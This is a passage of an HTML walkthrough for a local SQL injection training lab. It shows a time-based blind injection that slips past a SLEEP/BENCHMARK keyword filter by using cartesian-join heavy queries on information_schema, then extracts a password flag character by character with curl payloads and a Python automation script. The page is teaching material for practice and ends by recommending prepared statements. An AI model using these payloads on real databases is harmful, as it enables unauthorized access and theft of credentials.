<h4>Step 1: Observe the Constant Response</h4>
<p>
    The page always shows &ldquo;Search complete.&rdquo; regardless of input. No boolean
    signal, no error output.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. No Boolean Signal</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab12" --data-urlencode "search=login"<br>
        <span class="prompt">Response: </span><strong>Search complete.</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab12" --data-urlencode "search=xyznonexistent"<br>
        <span class="prompt">Response: </span><strong>Search complete.</strong>
    </div>
</div>

<h4>Step 2: Discover That SLEEP Is Blocked</h4>
<p>
    The natural next step for time-based blind injection is <code>SLEEP()</code>: but
    this lab has a keyword filter.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. SLEEP Blocked</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab12" --data-urlencode "search=' OR SLEEP(2) -- -"<br>
        <span class="prompt">Response: </span><strong>Blocked keyword detected</strong> -- the input contains a restricted function.<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab12" --data-urlencode "search=' OR BENCHMARK(10000000, SHA1('test')) -- -"<br>
        <span class="prompt">Response: </span><strong>Blocked keyword detected</strong> -- the input contains a restricted function.
    </div>
</div>

<p>
    Both <code>SLEEP</code> and <code>BENCHMARK</code> are blocked by <code>stripos()</code>.
    We need an alternative timing technique.
</p>

<h4>Step 3: Heavy Query Technique. Cartesian Joins</h4>
<p>
    Instead of <code>SLEEP()</code>, we can generate CPU load by performing a
    <strong>cartesian product</strong> (cross join) on <code>information_schema</code>
    tables. If <code>information_schema.columns</code> has N rows, joining it with
    itself produces N&times;N rows. Counting these rows takes measurable time.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Heavy Query Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Note: plain OR won't work here because LIKE '%' always matches</span><br>
        <span class="prompt">// and MySQL short-circuits the OR. Use AND 0 OR to force evaluation:</span><br><br>
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab12" \<br>
        &nbsp;&nbsp;--data-urlencode "search=' AND 0 OR (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C) -- -"<br>
        <span class="prompt">Response: </span>Search complete. <strong>(elapsed: 2802ms -- ~2.8 seconds delay confirmed)</strong><br><br>
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab12" --data-urlencode "search=normal_search"<br>
        <span class="prompt">Response: </span>Search complete. <strong>(elapsed: 25ms -- instant baseline)</strong><br><br>
        <span class="prompt">// </span>A 2-table join is too fast (49ms on this server). MariaDB aggressively optimizes COUNT(*).<br>
        <span class="prompt">// </span>Use 3 tables (columns &times; columns &times; tables) for a reliable ~2-3s delay.
    </div>
</div>

<p>
    The delay from the cartesian join confirms we have a timing oracle without
    using <code>SLEEP()</code> or <code>BENCHMARK()</code>.
</p>
<p>
    <strong>Important:</strong> We use <code>' AND 0 OR</code> instead of plain <code>' OR</code>.
    The query is <code>WHERE event LIKE '%..%'</code> -- since <code>LIKE '%'</code> always
    matches, MySQL <strong>short-circuits</strong> the OR and never evaluates the heavy query.
    <code>AND 0</code> forces the first condition to FALSE, so MySQL must evaluate the OR branch.
</p>

<h4>Step 4: Conditional Heavy Query with IF()</h4>
<p>
    Wrap the heavy query inside <code>IF()</code> to make it conditional on a boolean test.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Conditional Heavy Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// TRUE condition -- heavy query executes, causes delay:</span><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(1=1, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C), 0) -- -"<br>
        <span class="prompt">Response: </span>Search complete. <strong>(elapsed: 2894ms -- delay confirmed!)</strong><br><br>
        <span class="prompt">// FALSE condition -- heavy query skipped, instant:</span><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(1=2, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C), 0) -- -"<br>
        <span class="prompt">Response: </span>Search complete. <strong>(elapsed: 26ms -- instant, no delay)</strong>
    </div>
</div>

<h4>Step 5: Extract the First Character</h4>
<p>
    Combine the conditional heavy query with <code>ASCII(SUBSTRING(...))</code> to
    extract the password character by character.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract First Character</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Test if first char = 'F' (ASCII 70)</span><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(ASCII(SUBSTRING((SELECT password FROM master_password LIMIT 1),1,1))=70, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C), 0) -- -"<br>
        <span class="prompt">Response: </span>Search complete. <strong>(elapsed: 2898ms -- TRUE! First char is 'F')</strong><br>
        <span class="prompt">Result: </span>First character = 'F' (ASCII 70)
    </div>
</div>

<h4>Step 6: Binary Search with Heavy Queries</h4>
<p>
    Use binary search to minimise the number of heavy queries per character.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Binary Search (char at position 6)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Target: 'h' = ASCII 104</span><br><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(ASCII(SUBSTRING(...,6,1))>96, (SELECT count(*) FROM ...), 0) -- -"<br>
        <span class="prompt">Response: </span>2929ms (TRUE -- &gt; 96)<br><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(ASCII(SUBSTRING(...,6,1))>112, (SELECT count(*) FROM ...), 0) -- -"<br>
        <span class="prompt">Response: </span>25ms (FALSE -- not &gt; 112)<br><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(ASCII(SUBSTRING(...,6,1))>104, (SELECT count(*) FROM ...), 0) -- -"<br>
        <span class="prompt">Response: </span>32ms (FALSE -- not &gt; 104)<br><br>
        <span class="prompt">$ </span>time curl -s ".../lab12..." --data-urlencode "search=' AND 0 OR IF(ASCII(SUBSTRING(...,6,1))=104, (SELECT count(*) FROM ...), 0) -- -"<br>
        <span class="prompt">Response: </span>3228ms (TRUE -- ASCII 104 = 'h' confirmed)
    </div>
</div>

<h4>Step 7: Tuning the Heavy Query</h4>
<p>
    The delay depends on the size of <code>information_schema.columns</code>.
    Adjust the number of self-joins:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Tuning Joins</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Two joins (N&times;N) -- MariaDB optimizes this too well:</span><br>
        <span class="prompt">Query: </span>SELECT count(*) FROM information_schema.columns A, information_schema.columns B<br>
        <span class="prompt">Timing: </span><strong>49ms</strong> -- <strong>too fast</strong> for a timing oracle!<br><br>
        <span class="prompt">// Hybrid: columns &times; columns &times; tables -- sweet spot:</span><br>
        <span class="prompt">Query: </span>SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C<br>
        <span class="prompt">Timing: </span><strong>2802ms</strong> -- good delay for reliable oracle<br><br>
        <span class="prompt">// Three column joins (N&times;N&times;N) -- very slow:</span><br>
        <span class="prompt">Query: </span>SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C<br>
        <span class="prompt">Timing: </span>~20+ seconds -- too slow, use as fallback only<br><br>
        <span class="prompt">Tip: </span>Start with columns&times;columns&times;tables. If too fast, use triple columns. If too slow, reduce to two tables.
    </div>
</div>

<h4>Step 8: Full Extraction</h4>
<p>
    Extract all characters. Automation is strongly recommended for heavy-query timing
    attacks since each request is slow.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  h  3  4  v  y  _  q  u  3  r  y  _  t  1  m  1  n  g  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{h34vy_qu3ry_t1m1ng}</strong>
    </div>
</div>

<h4>Step 9: Python Automation Script</h4>
<p>
    Heavy-query timing attacks are very slow manually. Use this complete Python script
    with auto-calibration, retry logic, and binary search:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 9. Python Automation (lab12_heavy_query.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab12_heavy_query.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>Calibrating heavy query delay...<br>
        <span class="prompt">[*] </span>Heavy query #1 took 2.58s<br>
        <span class="prompt">[+] </span>Using heavy query #1 (2.58s delay)<br>
        <span class="prompt">[*] </span>FALSE condition: 0.004s (should be near-instant)<br>
        <span class="prompt">[+] </span>Confirmed: SLEEP is blocked by keyword filter<br>
        <span class="prompt">[+] </span>Password length: 24<br>
        <span class="prompt">[*] </span>Extracting password (24 chars, heavy queries are slow -- be patient)...<br>
        <span class="prompt">&nbsp;&nbsp;[ 1/24] </span>F  (10.6s elapsed)<br>
        <span class="prompt">&nbsp;&nbsp;...</span><br>
        <span class="prompt">&nbsp;&nbsp;[24/24] </span>FLAG{h34vy_qu3ry_t1m1ng}  (259.2s elapsed)<br><br>
        <span class="prompt">[+] </span>Password: FLAG{h34vy_qu3ry_t1m1ng}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab12_heavy_query.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab12_heavy_query.py')); ?></pre></div>
</div>

<h4>Step 10: Submit the Master Password</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{h34vy_qu3ry_t1m1ng}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Even when <code>SLEEP()</code> and <code>BENCHMARK()</code>
    are blocked, time-based blind injection is still possible using heavy queries that
    generate CPU load through cartesian joins. Keyword filters are an incomplete defense
   : they can always be bypassed. The only reliable defense is <strong>prepared
    statements</strong> with parameterized queries.
</div>
